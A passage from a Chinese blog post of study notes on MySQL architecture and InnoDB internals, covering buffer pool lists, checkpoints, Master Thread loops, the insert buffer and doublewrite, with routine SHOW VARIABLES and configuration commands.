class="line">&#x2F;&#x2F;mysql数据库会以读取到的最后一个配置文件中的参数为准</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;找到数据文件的目录</span><br><span class="line">SHOW VARIABLES LIKE &#39;datadir&#39;\G    得到&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;</span><br><span class="line">&#x2F;&#x2F;查看文件夹下文件</span><br><span class="line">system ls-lh &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Mysql体系结构"><a href="#Mysql体系结构" class="headerlink" title="Mysql体系结构"></a>Mysql体系结构</h3><ol><li>数据库是文件的集合，是依照某种数据模型组织起来并存放于二级存储器中的数据集合</li><li>数据库实例是程序，是位于用户于操作系统之间的一层数据管理软件</li><li>应用程序只有通过数据库实例才能和数据库打交道</li></ol><p>mysql体系</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211009212246.png"></p><p>对应的解释：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211009212331.png"></p><p>mysql数据库区别于其他数据库的重要特点就是插件式的表存储引擎。</p><p><strong>存储引擎是基于表的，而不是数据库。</strong></p><h3 id="Mysql存储引擎"><a href="#Mysql存储引擎" class="headerlink" title="Mysql存储引擎"></a>Mysql存储引擎</h3><p><strong>存储引擎的好处</strong>：每个存储引擎都有各自的特点，能够根据具体的应用建立不同存储引擎表。</p><p><strong>常见的存储引擎：</strong></p><p>InnoDB存储引擎支持事务，主要面向在线事务处理OLTP的应用，特点是行锁设计，支持外键    ，支持类似于Oracle的非锁定读，默认读取操作不会产生锁。InnoDB存储引擎是默认的存储引擎。</p><p>InnoDB通过使用多版本并发控制（MVVC）来获得高并发性。提供了插入缓冲、二次写、自适应哈希索引、预读等高性能和高可用的功能。</p><p>对于表中的数据的存储，InnoDB采用了聚集的方式，每张表的存储按主键的顺序进行存放。如果没有显示的指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键。</p><p>=================================================================</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看当前数据库所支持的存储引擎</span><br><span class="line">SHOW ENGINES\G;</span><br></pre></td></tr></table></figure><h3 id="连接Mysql"><a href="#连接Mysql" class="headerlink" title="连接Mysql"></a>连接Mysql</h3><p>连接Mysql操作是一个连接进程和Mysql数据库实例进行通信。本质上进程通信。</p><p>常用的进程通信方式有：</p><ol><li>管道</li><li>命名管道</li><li>命名字</li><li>TCP/IP套接字</li><li>UNIX域套接字</li></ol><p>TCP/IP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.101 -u david -p</span><br></pre></td></tr></table></figure><p>命名管道和共享内存：</p><p>两个需要通信的进程在同一台服务器上，必须在mysql配置文件仲启用-enable-named-pipe</p><p>UNIX域套接字：</p><p>只能在Mysql客户端和数据库实例在一台服务器上的情况下使用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看套接字文件路径</span><br><span class="line">SHOW VARIABLES LIKE &#39;socket&#39;</span><br><span class="line">&#x2F;&#x2F;通过套接字文件路径连接</span><br><span class="line">mysql -udavid -S &#x2F;tmp&#x2F;mysql.sock</span><br></pre></td></tr></table></figure><h2 id="2、InnoDB存储引擎"><a href="#2、InnoDB存储引擎" class="headerlink" title="2、InnoDB存储引擎"></a>2、InnoDB存储引擎</h2><p>InnoDB是事务安全的Mysql存储引擎，是OLTP应用中核心表的首选存储引擎。</p><h3 id="2-1InnoDB体系架构"><a href="#2-1InnoDB体系架构" class="headerlink" title="2.1InnoDB体系架构"></a>2.1InnoDB体系架构</h3><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015143846.png"></p><p>后台线程主要作用：</p><ol><li>负责刷新内存池中的数据</li><li>将已经修改的数据文件刷新到磁盘文件</li><li>保证数据库异常时InnoDB能回复到正常运行状态。</li></ol><h4 id="2-1-1-后台线程"><a href="#2-1-1-后台线程" class="headerlink" title="2.1.1 后台线程"></a>2.1.1 后台线程</h4><p><strong>Master   Thread</strong></p><p>核心后台线程</p><p>主要负责将缓冲池中的数据异步刷新到磁盘，保持数据一致性</p><p>包括脏页的刷新、合并插入缓冲、UNDO页的回收等。</p><p><strong>IO Thread</strong></p><p>InnoDB中大量使用AIO（Async  IO）处理写IO请求 ，这样可以极大的提高数据库性能。</p><p>IO Thread负责这些IO请求的回调处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查看当前InnoDB的版本</span></span><br><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;innodb_version&#x27;</span>\G;</span><br><span class="line"><span class="comment">//查看io thread进程的参数</span></span><br><span class="line">SHOW VARIABLES LIKE <span class="string">&#x27;innodb_%io_threads&#x27;</span>\G;</span><br><span class="line"><span class="comment">//查看INNODB的所有状态参数</span></span><br><span class="line">SHOW ENGINE INNODB STATUS\G;</span><br></pre></td></tr></table></figure><p><strong>Purge Thread</strong></p><p>事务提交后，使用的undolog不再需要，需要PurgeThread来回收已经使用并分配的undo页。</p><p>用户可以在mysql数据库的配置文件中添加命令来启用独立的Purge Thread</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqlId]</span><br><span class="line">innodb_purge_thread&#x3D;1;</span><br></pre></td></tr></table></figure><p>InnoDB支持多个Purge Thread      为了进一步加快undo页的回收。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#39;innodb_purge_threads&#39;\G</span><br></pre></td></tr></table></figure><p><strong>Page Cleaner Thread</strong></p><p>将版本中脏页刷新操作放在单独的线程中来完成。</p><p>进一步减轻Master Thread工作以及对于用户查询线程的阻塞。</p><h4 id="2-1-2-内存"><a href="#2-1-2-内存" class="headerlink" title="2.1.2 内存"></a>2.1.2 内存</h4><p>1.<strong>缓冲池</strong></p><p>InnoDB基于磁盘存储，按页进行管理。可将其视为磁盘的数据库系统。</p><p>缓冲池是在cpu和磁盘之间的一块内存区域，起到cache的作用。</p><p>数据库读页时：</p><ol><li>将从磁盘读到的页放在缓冲池中，称为“FIX”</li><li>下一次读取相同页时，判断该页是否再缓冲池中，若在则直接命中</li><li>否则就读取磁盘</li></ol><p>数据库修改页时：</p><ol><li>先修改再缓冲池中的页，以一定的频率刷新到磁盘上。</li><li>并不是每次页更新时，而是通过Checkpoint机制刷新回到磁盘。</li></ol><p>缓冲池大小影响数据库性能。由于32为操作系统的限制。最多将该值设为3G，建议将数据库服务器都采用64位的操作系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;显示缓冲池容量大小</span><br><span class="line">SHOW VARIABLES LIKE &#39;innodb_buffer_pool_size&#39;\G</span><br></pre></td></tr></table></figure><p>缓冲池中缓存的数据页类型：</p><ol><li>索引页</li><li>数据页</li><li>undo页</li><li>插入缓冲</li><li>自适应哈希索引</li><li>InnoDB存储的锁信息</li><li>数据字典信息</li></ol><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015151823.png"></p><p>允许有多个缓冲池实例。根据哈希值平均分配到不同缓冲池实例中。</p><p>减少数据库内部的资源竞争，增加并发处理能力。</p><p>通过参数innodb_buffer_pool_instance进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看缓冲池实例的个数</span><br><span class="line">SHOW VARIABLES LIKE &#39;innodb_buffer_pool_instance&#39;\G</span><br></pre></td></tr></table></figure><p>当然从5.6版本以后就可以再information_schema架构下的表INNNODB_BUFFER_POOL_STATS来观察缓冲池的状态。</p><p>2.<strong>LRU Iist、Free List、Flush List</strong></p><p>缓冲池是通过LRU算法进行管理的：</p><ul><li>频繁使用的页放在LRU列表的前端，最少使用页放在LRU列表的尾端</li><li>当缓冲池不能存放新读取到的页时，首先释放LRU列表中尾端的页。</li></ul><p>InnoDB存储引擎中，缓冲池默认大小为16KB。同样使用LRU算法对缓存进行管理。再InnoDB存储引擎中，还加入了Midpoint位置。</p><p>新读取到的页，虽然是最新访问的页，但是并不是直接放入到LRU列表首部，而是放到Midpoint位置。这个算法在InnoDB存储引擎下称为midpoint insertion strategy。默认配置下，该位置在LRU列表长度的5/8处。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看midpoint位置</span><br><span class="line">SHOW VARIABLES LIKE &#39;innodb_old_blocks_pct&#39;\G;</span><br></pre></td></tr></table></figure><p>midpoint之前的称为new列表，之后的称为old列表。</p><p>普通的LRU算法在执行索引或数据的扫描操作时，可能会将热点数据从LRU列表中删除。下一次则又需要从磁盘中进行访问。</p><p>InnoDB引入了一个参数进一步管理LRU列表—–innodb_old_blocks_time</p><p>表示页读取到mid位置后还需要等待多久才会被加入到LRU列表的热端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL innodb_old_blocks_time&#x3D;1000;</span><br></pre></td></tr></table></figure><hr><p>当数据库刚启动时，LRU列表是空的，没有任何的页。页都存放在Free列表中。</p><ol><li>需要从缓冲池中分页时，首先从Free列表中查找是否有可用的空闲页</li><li>若有，则将该页从Free中删除，放入到LRU列表中</li><li>否则，根据LRU算法，淘汰LRU列表末尾的页，将内存空间分配给新的页。</li><li>从old到new  称为page made young   因为innodb_old_blocks_time导致没有从old到new称为page not made young</li></ol><p>SHOW ENGINE INNODB STATUS 显示的不是当前的状态，而是过去某个时间范围内Innodb存储引擎的状态。</p><p>InnoDB支持压缩页的功能，可以将原本的16KB页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，是通过unzip_LRU列表进行管理的。</p><ol><li>unzip_LRU列表中对不同压缩页大小的页进行分别管理</li><li>通过<strong>伙伴算法</strong>进行内存的分配</li></ol><p>伙伴算法：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211015165405.png"></p><hr><p>在LRU列表中页被修改后，页被称为脏页。</p><p>脏页：缓冲池中的页和磁盘中的数据产生了不一致。</p><p>这个时候通过CHECKPOINT机制将脏页刷新回到磁盘，而Flush列表中的页即为脏页列表。需要注意的是，脏页既存在于LRU列表中，也存在FLUSH列表中。LRU列表用来管理缓冲池中页的可用性，Flush列表用来管理将页刷新回磁盘。</p><p>Flush列表页可以通过SHOW ENGINE INNODB STATUS来查看。Modified db pages 就显示了脏页的数量。</p><p>3.<strong>重做日志缓冲</strong></p><p>InnoDB引擎存储的内存区除了有缓冲池外，还有重做日志缓冲。</p><ol><li>InnoDB首先将重做日志信息先放入缓冲区</li><li>按照一定频率将其刷新到重做日志文件</li></ol><p>重做日志缓冲一般不需要设置的很大，一般情况下每一秒钟会将重做日志缓冲刷新到日志文件。只需保证每秒产生的事务量在缓冲大小之内即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看日志缓冲大小</span><br><span class="line">SHOW VARIABLES LIKE &#39;innodb_log_buffer_size&#39;\G</span><br></pre></td></tr></table></figure><p>在以下三种情况下会重做日志缓冲文件中的内容刷新到外部磁盘的重做日志文件中：</p><ol><li>Master Thread每一秒将重做日志缓冲刷新到重做日志文件</li><li>每个事务提交时会将重做日志缓冲刷新到重做日志文件</li><li>当重做日志缓冲池剩余空间小于1/2时，重做日志缓冲刷新到重做日志文件中。</li></ol><p>4.<strong>额外的内存池</strong></p><p>在InnoDB存储引擎中，对内存的管理是通过一种称为<strong>内存堆</strong>的方式进行的。在对一些数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不够时，会从缓冲池中进行申请。</p><h3 id="2-2-Checkpoint技术"><a href="#2-2-Checkpoint技术" class="headerlink" title="2.2 Checkpoint技术"></a>2.2 Checkpoint技术</h3><p>为了避免发生数据丢失的问题，当前事务数据库系统普遍都采用了Write Ahead Log策略——当事务提交时，先重做日志，再修改页。当由于发生宕机导致数据库数据丢失时通过重做日志来完成数据的恢复。</p><hr><p>Cheackpoint技术解决以下几个问题：</p><ol><li>缩短数据库的恢复时间</li><li>缓冲池不够用时，将脏页刷新到磁盘。</li><li>重做日志不可用时，刷新脏页</li></ol><p>如何解决</p><ul><li>当数据库发生宕机时，数据库不需要重做所有的日志，因为Checkpoint之前的页都已经刷新回到磁盘，顾数据库只需对Checkpoint后的重做日志进行回复。</li><li>当缓冲池不够用时，根据LRU算法会溢出最近最少使用的页，若此页是脏页，需强制执行Checkpoint，将脏页刷新到磁盘。</li><li>重做日志可以被重用的部分是指这些重做日志已经不在需要，若此时重做日志还需要使用，必须强制产生Checkpoint，将缓冲池中的页至少刷新到当前重做日志的位置。</li></ul><p>InnoDB是通过LSN(log sequence number)来标记版本的。</p><p>Checkpoint做的事就是将缓冲池中的脏页刷新回到磁盘。</p><p>不同之处在于每次刷新多少页到磁盘，从哪里取脏页，什么时候触发Checkpoint。InnoDB有两种Checkpoint：</p><ol><li><p>Sharp Checkpoint</p><p>发生在数据库关闭时将所有的脏页刷新回到磁盘。参数innodb_fast_shutdown=1。若在运行时使用Sharp Checkpoint那么数据库可用性会收到很大的影响。</p></li><li><p>Fuzzy Checkpoint</p><p>InnoDB中使用Fuzzy Checkpoint进行页的刷新。</p><p>只刷新一部分脏页，而不是刷新所有的脏页到磁盘。</p><ol><li><p>Master Thread Checkpoint</p><p>每秒或每10秒从缓冲池的脏页刷新一定比例的页回磁盘</p></li><li><p>FLUSH_LRU_LIST Checkpoint</p><p>检查LRU列表中是否有足够的可用空间操作发生在用户查询线程中，倘若没有100个可用页，那么InnoDB存储引擎会将LRU列表尾端的页移除。如果页中有脏页的话，需要进行Checkpoint。</p><p>从5.6以后，该检查单独放到了Page Cleaner中 参数innodb_lru_scan_depth控制LRU列表中可用页的数量</p></li><li><p>Async/Sync Flush Checkpoint</p><p>重做日志文件不可用时，需要强制将一些页刷新回磁盘。</p></li><li><p>Dirty Page too much Checkpoint</p><p>脏页数量太多，导致INNODB强制进行Checkpoint。保证缓冲池中有足够可用的页。innodb_max_dirty_pages_pct控制 当超过对应值时进行刷新。</p></li></ol></li></ol><h3 id="2-3Master-Thread工作方式"><a href="#2-3Master-Thread工作方式" class="headerlink" title="2.3Master Thread工作方式"></a>2.3Master Thread工作方式</h3><p>Master Thread 具有最高的线程优先级别。</p><h4 id="2-3-1-InnoDB-1-0x-版本之前的Master-Thread"><a href="#2-3-1-InnoDB-1-0x-版本之前的Master-Thread" class="headerlink" title="2.3.1 InnoDB 1.0x 版本之前的Master Thread"></a>2.3.1 InnoDB 1.0x 版本之前的Master Thread</h4><p>内部有多个循环(loop)组成：</p><ol><li>主循环(loop)</li><li>后台循环(backgroup loop)</li><li>刷新循环（flush loop)</li><li>暂停循环(suspend loop)</li></ol><p>1.主循环</p><p>大多数操作在这个循环中，主要包括两部分</p><ol><li><p>每秒钟操作</p><ol><li><p>日志刷新到磁盘，即使事务还没有提交（总是）</p><p>问：再大的事务为什么提交时间也很短？</p><p>即使某个事务还未提交，InnoDB存储引擎仍然每秒会将重做日志缓冲中的内容刷新到重做日志文件。</p></li><li><p>合并插入缓冲（可能）</p><p>判断当前一秒内发生的IO次数是否小于5次</p></li><li><p>至少刷新100个InnoDB的缓冲池中的脏页到磁盘（可能）</p><p>判断当前缓冲池中脏页的比例(buf_get_modified_ratio_pct)是否超过了配置文件中的(innodb_max_dirty_pages_pct默认为90)，如果超过，InnoDB认为需要做磁盘同步的操作，将100个脏页写入磁盘中。</p></li><li><p>当前用户没有活动，切换到后台循环（可能）</p></li></ol></li><li><p>每10秒钟操作</p><ol><li><p>刷新100个脏页到磁盘（可能的情况下）</p><p>判断过去10秒之内磁盘的IO操作是否小于200次，如果是，则将100个脏页刷新到磁盘。</p></li><li><p>合并至多5个插入缓冲（总是）</p><p>这个阶段不同于1秒时操作，他总会执行</p></li><li><p>将日志缓冲刷新到磁盘（总是）</p></li><li><p>删除无用的Undo页（总是）</p><p>判断当前事务系统中已经被删除的行为是否可以删除，比如有可能还有查询操作需要读取之前的版本中的undo信息。</p></li><li><p>刷新100个或者10个脏页到磁盘（总是）</p><p>判断缓冲池中脏页的比例(buf_get_modified_ratio_pct)，如果有超过70%脏页，则刷新100个脏页到磁盘，小于70%，则只刷新10%到磁盘。</p></li></ol></li></ol><p>2.后台循环</p><p>若当前没有用户活动（数据库空闲时）或者数据库关闭，就会切换到该循环。</p><p>执行以下操作：</p><ol><li>删除无用的Undo页（总是）</li><li>合并20个插入缓冲（总是）</li><li>跳回主循环（总是）</li><li>不断刷新100个页直到符合条件（可能，跳转到flush loop中完成）</li></ol><p>若flush loop中没有什么事情可以做了，InnoD存储引擎会切换到suspend_loop，将Master Thread挂起，等待事件的发生。若启用了InnoDB存储引擎，却没有使用任何InnoDB存储引擎的表，那么Master Thread总是 处于挂起的状态。</p><h4 id="2-3-2-InnoDB1-2x之前的Master-Thread"><a href="#2-3-2-InnoDB1-2x之前的Master-Thread" class="headerlink" title="2.3.2 InnoDB1.2x之前的Master Thread"></a>2.3.2 InnoDB1.2x之前的Master Thread</h4><p>之前版本的问题：InnoDB存储引擎最大只会刷新100个脏页到磁盘，合并20个插入缓冲。在写入密集的应用程序中，每秒可能会产生大于100个的脏页，如果是产生大于20个插入缓冲的情况，Master Thread会忙不过来。当发生宕机恢复时，由于很多数据还没有刷新回磁盘，导致恢复的时间可能需要很久。</p><p><strong>解决方案：</strong></p><p>①InnoDB提供了参数<strong>innodb_io_capacity</strong>，用来表示磁盘的IO吞吐量，默认值为200。刷新到磁盘页的数量，会按照innodb_io_capacity百分比进行控制。</p><ul><li>在合并插入缓冲时，合并插入缓冲的数量innodb_io_capacity值的5%</li><li>从缓冲区刷新脏页时，刷新脏页得数量为innodb_io_capacity</li></ul><p>因此可以根据存储设备拥有更高IO速度时，将这个参数调高一点，直到符合磁盘IO的吞吐量。</p><p>②参数<strong>innodb_max_dirty_pages_pct</strong>该值的默认值为90，意味着脏页占缓冲池超过百分之90，才会刷新100个脏页。如果内存足够或者数据库服务器压力大，刷新脏页速度反而会降低。</p><p>从1.0x版本开始<strong>innodb_max_dirty_pages_pct</strong>参数的默认值变为了75。既加快刷新脏页的频率，又保证了磁盘IO的负载。</p><p>③参数<strong>innodb_adaptive_flushing</strong>（自适应地刷新），影响每秒刷新脏页地数量。</p><p>原来的刷新规则：</p><p>脏页在缓冲池所占比例小于innodb_max_dirty_pages_pct时，不刷新脏页。大于innodb_max_dirty_pages_pct时，刷新100个脏页。</p><p>引入参数后刷新规则：</p><p>InnoDB存储引擎通过一个名为buf_flush_get_desired_flush_rate函数判断刷新脏页最合适的数量。该函数通过判断产生重做日志的速度决定最合适的刷新脏页数量。因此即使党脏页的比例小于innodb_max_dirty_pages_pct时，也会刷新一定量的脏页。</p><p>④之前每次进行full purge时，最多回收20个Undo页，现在引入了参数<strong>innodb_purge_batch_size</strong> 该参数可以控制每次full purge回收undo页的数量。</p><p>默认值为20可以进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global innodb_purge_batch_size&#x3D;50;</span><br></pre></td></tr></table></figure><h4 id="2-3-3Innodb-1-2x版本的Master-Thread"><a href="#2-3-3Innodb-1-2x版本的Master-Thread" class="headerlink" title="2.3.3Innodb 1.2x版本的Master Thread"></a>2.3.3Innodb 1.2x版本的Master Thread</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if InnoDB is idle</span><br><span class="line">srv_master_do_idle_tasks();</span><br><span class="line">else </span><br><span class="line">srv_master_do_active_tasks();</span><br></pre></td></tr></table></figure><p>srv_master_do_idle_tasks()就是之前版本中10秒的操作</p><p>srv_master_do_active_tasks()处理之前每秒的操作</p><p>对于刷新脏页的操作，从Master Thread分离到一个单独的Page Cleaner Thread，从而减轻了Master Thread工作。</p><h3 id="2-4InnoDB关键特性"><a href="#2-4InnoDB关键特性" class="headerlink" title="2.4InnoDB关键特性"></a>2.4InnoDB关键特性</h3><p>包括</p><ul><li>插入缓冲（Insert Buffer）</li><li>两次写</li><li>自适应哈希索引</li><li>异步IO</li><li>刷新邻接页</li></ul><h4 id="2-4-1-插入缓冲"><a href="#2-4-1-插入缓冲" class="headerlink" title="2.4.1 插入缓冲"></a>2.4.1 插入缓冲</h4><h5 id="2-4-1-1Insert-Buffer"><a href="#2-4-1-1Insert-Buffer" class="headerlink" title="2.4.1.1Insert Buffer"></a>2.4.1.1Insert Buffer</h5><p>Insert Buffer和数据页一样，都是物理页的一个组成部分。</p><p>InnoDB中，主键是行唯一的标识符。应用程序中行记录的插入顺序是按照主键递增的顺序进行插入的。插入聚集索引一般是顺序的，不需要磁盘的随机读取。</p><p>并不是所有的主键插入都是顺序的。主键类若是UUID这样的类，那么插入和辅助索引一样，同样是随机的。即使主键自增，插入的也是指定的值，而不是null值，同样导致插入非连续。</p><p>当一张表上有多个非聚集索引时，在进行插入操作时，数据页的存放还是按照主键进行顺序存放的，对于非聚集索引叶子结点的插入不再是顺序的，需要离散的访问非聚集索引页，从而随机读取导致了插入操作性能下降。<strong>这是因为B+树的特性决定了非聚集索引插入的离散性。</strong></p><p>某些情况下辅助索引的插入依然是顺序的，或者是比较顺序的。比如购买时间。</p><hr><p>InnoDB存储引擎的Insert Buffer，对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引是否在缓冲池中，若在，直接插入。若不在，则先放到一个Insert Buffer对象。然后再以一定的频率和情况进行Insert Buffer和辅助索引页子结点的merge（合并）操作，这时通常能将多个插入合并到一个操作中，大大提高了非聚集索引插入的性能。</p><p>然而Insert Buffer需要同时满足以下两个条件：</p><ol><li>索引是辅助索引</li><li>索引不是唯一的</li></ol><p>满足条件时，InnoDB会使用Insert Buffer。应考虑这种情况：</p><p>应用程序进行大量的插入操作，都涉及了不唯一的非聚集索引，使用了Insert Buffer。若此时Mysql数据库发生了宕机，就会造成大量的Insert Buffer并没有合并到实际的非聚集索引中去。因此这时恢复需要几个小时。</p><p>辅助索引不能是唯一的，因为再插入缓冲中，数据库不去查找索引页来判断插入的记录的唯一性。如果去找肯定会有离散读取的情况发生，从而导致Insert Buffer失去意义。</p><h5 id="2-4-1-2-Change-Buffer"><a href="#2-4-1-2-Change-Buffer" class="headerlink" title="2.4.1.2 Change Buffer"></a>2.4.1.2 Change Buffer</h5><p>InnoDB 1.0x版本开始引入了Change Buffer。适用对象依然是非唯一的辅助索引。</p><p>从这个版本开始，InnoDB可以对DML操作都进行缓冲——INSERT,DELETE,UPDATE,他们分别是Insert Buffer，Delete Buffer（删除标记），Purge Buffer（进行删除）。</p><p>InnoDB存储引擎提供了参数<strong>innodb_change_buffering</strong>，用来开启各种Buffer选项。该参数可选(默认为all)</p><ol><li>inserts</li><li>deletes</li><li>purges</li><li>changes</li><li>all</li><li>none</li></ol><p>1.2x版本开始，可以通过参数innodb_change_buffer_max_size控制Change Buffer最大使用内存的数量。该值表示最多使用25%的缓冲池内存空间。最大有效值为50%。</p><h5 id="2-4-1-3-Insert-Buffer的内部实现"><a href="#2-4-1-3-Insert-Buffer的内部实现" class="headerlink" title="2.4.1.3 Insert Buffer的内部实现"></a>2.4.1.3 Insert Buffer的内部实现</h5><p>Insert Buffer的数据结构是一颗B+树。在Mysql 4.1之前的版本中每张表有一颗Insert Buffer B+树。而现在的版本中，全局只有一颗Insert Buffer B+树，<strong>负责对所有的表的辅助索引进行Insert Buffer</strong>。</p><p>这棵B+树放在共享表空间中，默认也就是ibdata1中。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211021151837.png"></p><p>键值占9字节，space表示待插入记录所在表的表空间Id，Innodb中每个表有一个唯一的space id，通过该值可以查询是哪张表。</p><p>space 占4字节，maker 占1字节，offest表示页所在的偏移量，占4字节。</p><p>当一个辅助索引插入到页时（space，offset），该页如果不在缓冲池中，InnoDB根据上述规则构造一个键值，查询Insert Buffer这棵B+树，然后将记录插入到Insert Buffer B+树的叶子节点中。</p><p>插入到Insert Buffer叶子结点的记录，需要根据以下的规则进行构造</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211021155112.png"></p><p>space、marker、offset和之前非叶子结点含义相同，共占用9字节。</p><p>metadata占用4个字节,其存储的内容如表</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211021155551.png"></p><p><strong>IBUF_REC_OFFSET_COUNT</strong>用来排序每个记录进入Insert Buffer的顺序。通过这个顺序回放(replay)才能的到记录的正确值。</p><p>从Insert Buffer第5列开始，就是实际插入记录的各个字段了。因此比较原插入记录，Insert Buffe B+树的页子结点记录需要额外13字节的开销。</p><p>启用Insert Buffer索引后，辅助索引页中的记录可能被插到Insert Buffer B+树中，为了保证每次Merge Insert Buffer页必须成功，需要一个特殊的页来标记每个辅助索引页的可用空间。这个页的类型为Insert Buffer Bitmap。</p><p>每个Insert Buffer Bitmap用来追踪16384个辅助索引页，也就是256个区。每个Insert Buffer Bitmap页都在16384个页的第二页。</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211021161116.png"></p><h5 id="2-4-4-Merge-Insert-Buffer"><a href="#2-4-4-Merge-Insert-Buffer" class="headerlink" title="2.4.4 Merge Insert Buffer"></a>2.4.4 Merge Insert Buffer</h5><p>可能操作的几种情况：</p><p>1.辅助索引页被读取到缓冲池中</p><ol><li>执行正常的SELECT查询操作，检查Insert Buffer Bitmap页</li><li>确认该辅助索引页是否有记录存放在INsert Buffer中</li><li>若有，则将Insert Buffer B+树中该页的记录插入到该辅助索引页中。</li><li>对该页多次的记录操作通过一次操作合并到了原有的辅助索引页中。</li></ol><p>2.Insert Buffer Bitmap 追踪到该辅助索引页已无可用空间时</p><p>Insert Buffer Bitmap页用来追踪每个辅助索引页的可用空间，并至少有1/32的空间。若插入辅助索引记录时检测到插入记录后可用空间会小于1/32页，则会强制进行一个合并操作，即强制读取辅助索引页，将Insert Buffer B+树中该页的记录及待插入的记录插入到辅助索引页中。</p><p>3.Master Thread</p><p>在Master Thread线程中每秒或者每10秒会进行一次Merge Insert Buffer的操作，不同在于merge操作的页的数量不同。</p><p>在Master Thread中，执行merge操作不止一个页，根据srv_innodb_io_capactiy百分比决定真正合并多少个辅助索引页。</p><p>在Insert Buffer B+树中，辅助索引页根据(space,offset)已经排好序，可以根据(space,offset)排序顺序进行页的选择。对于Insert Buffer页的选择，InnoDB会随机选择Insert Buffer B+树中的一个页，读取该页中的space以及之后所需数量的页。若进行merge时，要进行merge表已经删除，此时可以直接丢弃已经被Insert/Change Buffer的胡数据记录。</p><h4 id="2-4-2-两次写"><a href="#2-4-2-两次写" class="headerlink" title="2.4.2 两次写"></a>2.4.2 两次写</h4><p>Insert Buffer带给InnoDB存储引擎的时性能上提示，两次写(doublewrite)带给InnoDB存储引擎的是数据页的可靠性。</p><hr><p><strong>部分写失效</strong></p><p>数据库宕机时，InnoDB正在写某个页列表，而这个页只写了一部分。导致数据丢失。</p><p>该问题无法通过重做日志文件进行恢复。原因：重做日志文件中记录的是对页的物理操作，如偏移量800，写“aaaa”记录。如果该页已经损坏，重做没有意义。</p><p><strong>doublewrite</strong>在应用重做日志文件前，用户需要一个页的副本，当写入失效发生时，先通过页的副本还原页，再进行重做。</p><p>InnoDB存储引擎中doublewrite体系架构：</p><p><img src="https://cdn.jsdelivr.net/gh/a2914475618/github-jsdelivr-@main/img/20211021183011.png"></p><p>doublewrite由两部分组成</p><ol><li>内存中的doublewrite buffer   大小2MB</li><li>物理磁盘上共享空间中连续的128个页，即两个区  大小2MB</li></ol><p><strong>两次写的过程</strong></p><p>对缓冲池中的脏页进行刷新时，不直接写磁盘</p><ol><li>通过memcpy函数将脏页先复制到内存中的doublewrite buffer</li><li>通过doublewrite buffer再分两次</li><li>每次1MB顺序地写入共享表空间地物理磁盘上</li><li>马上调用fsync函数，同步磁盘，避免缓冲写带来地问题</li></ol><p>doublewrite页是连续的，在完成doublewrite页的写入后，此时的写入则是离散的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;查看doublewrite运行情况</span><br><span class="line">show global status like 